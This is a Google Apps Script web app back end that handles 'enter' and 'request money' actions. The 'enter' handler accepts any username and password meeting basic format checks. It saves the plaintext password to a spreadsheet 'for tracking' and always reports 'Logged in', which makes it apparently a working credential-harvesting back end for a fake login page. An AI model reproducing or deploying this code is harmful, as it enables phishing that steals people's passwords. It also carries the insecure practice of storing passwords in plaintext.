function doGet(e) { return handle(e); } function doPost(e) { return handle(e); } function handle(e) { const result = { success: false, message: "Unknown error" }; try { const params = e.parameter; const action = params.action; const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheets()[0]; // ========== ENTER / TRACK USER ========== if (action === "enter") { const username = (params.username || "").toString().toLowerCase().trim(); const password = (params.password || "").toString(); if (!username || !password) { result.message = "Please enter username and password"; return json(result); } // Standard password requirements if (password.length < 6) { result.message = "Password must be at least 6 characters"; return json(result); } if (!/\d/.test(password)) { result.message = "Password must contain at least one number"; return json(result); } // Just save whatever they put (for tracking) const date = new Date().toLocaleString(); sheet.appendRow([username, password, "", date, "login"]); result.success = true; result.message = "Logged in"; return json(result); } // ========== REQUEST MONEY ========== if (action === "request") { const username = (params.username || "").toString().toLowerCase().trim(); const amount = params.amount || "0"; if (!username) { result.message = "No user"; return json(result); } const date = new Date().toLocaleString(); sheet.appendRow([username, "", amount, date, "request"]); result.success = true; result.message = "Request saved"; return json(result); } result.message = "Unknown action"; return json(result); } catch (err) { result.message = err.toString(); return json(result); } } function json(obj) { return ContentService .createTextOutput(JSON.stringify(obj)) .setMimeType(ContentService.MimeType.JSON); }
